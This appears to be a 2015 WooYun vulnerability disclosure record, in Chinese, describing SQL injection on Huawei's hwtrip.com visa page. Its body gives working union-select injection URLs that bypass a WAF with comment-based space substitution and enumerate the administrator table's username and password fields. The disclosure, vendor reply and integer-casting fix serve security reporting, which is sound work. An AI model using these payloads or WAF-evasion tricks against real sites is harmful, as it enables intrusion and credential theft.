{"id": 44573, "wybug_id": "wooyun-2015-099740", "wybug_title": "华为爱旅主站绕过过滤SQL注入", "wybug_corp": "华为技术有限公司", "wybug_author": "路人甲", "wybug_date": "2015-03-06 18:03", "wybug_open_date": "2015-04-20 18:04", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-03-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-03-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-20：\t细节向公众公开  简要描述： 两次绕过，感觉稍微有点艰难，还是可以绕过的！ 详细说明：  注入点为：http://www.hwtrip.com/v3/visa/product/detail?visaID=3首先直接加order by 1，order by 2，...,直到发现是9个字段\n\n然后通过union select 联合查询发现页面无法显示，通过看乌云漏洞发现应该是WAF吧\n\n   漏洞证明：  一、首先用/*!50000SeLect*/可以部分绕过检查1.查看user()和数据库名：http://www.hwtrip.com/v3/visa/product/detail?visaID=-1%20union%20/*!50000SeLect*/%201,2,3,user(),5,6,7,database(),9#\n\n2.查看数据库版本为5.5.14：\n\n3.然后通过数据库名查看数据库表呗，发现又一次悲剧了，没有任何回显：http://www.hwtrip.com/v3/visa/product/detail?visaID=-1%20union%20/*!50000SeLect*/%201,2,3,TABLE_NAME,5,6,7,8,9,10 from information_schema.TABLES where TABLE_SCHEMA=0x68777472697032#\n\n然后各种尝试将关键词加/*!50000*/发现都不能绕过，最后加Limit 0,1限制也不对，找sqlmap绕过WAF的py脚本尝试也不行，差点就放弃提交上来了，后来一朋友提醒绕WAF首先要搞定空格！突然大悟，然后开始接下来的尝试。二、/*123*/代替空格成功绕过1.http://www.hwtrip.com/v3/visa/product/detail?visaID=-1/*123*/union/*123*/SeLect/*123*/1,2,3,table_name,5,6,7,8,9/*123*/From/*123*/information_schema.tables/*123*/Where/*123*/TABLE_SCHEMA=0x68777472697032/*123*/Limit/*123*/0,1#\n\n2.然后就是找关键表了，成功遍历到hwtrip_administrators表：http://www.hwtrip.com/v3/visa/product/detail?visaID=-1/*123*/union/*123*/SeLect/*123*/1,2,3,table_name,5,6,7,8,9/*123*/From/*123*/information_schema.tables/*123*/Where/*123*/TABLE_SCHEMA=0x68777472697032/*123*/Limit/*123*/13,1#\n\n3.找字段，发现敏感字段是username和password：http://www.hwtrip.com/v3/visa/product/detail?visaID=-1/*123*/union/*123*/SeLect/*123*/1,2,3,COLUMN_NAME,5,6,7,8,9/*123*/From/*123*/information_schema.columns/*123*/Where/*123*/TABLE_NAME=0x6877747269705F61646D696E6973747261746F7273/*123*/Limit/*123*/1,1#\n\nhttp://www.hwtrip.com/v3/visa/product/detail?visaID=-1/*123*/union/*123*/SeLect/*123*/1,2,3,COLUMN_NAME,5,6,7,8,9/*123*/From/*123*/information_schema.columns/*123*/Where/*123*/TABLE_NAME=0x6877747269705F61646D696E6973747261746F7273/*123*/Limit/*123*/3,1#\n\n4.查看密码：\n\n密码破不出来，那就换个账户吧heyong密码相同\n\n   修复方案：  waf不是万能的还是对参数进行整型转换下吧   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-03-09 11:23 厂商回复： 非常感谢白帽子对华为公司安全的关注，我们已通知业务部门修复该漏洞。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}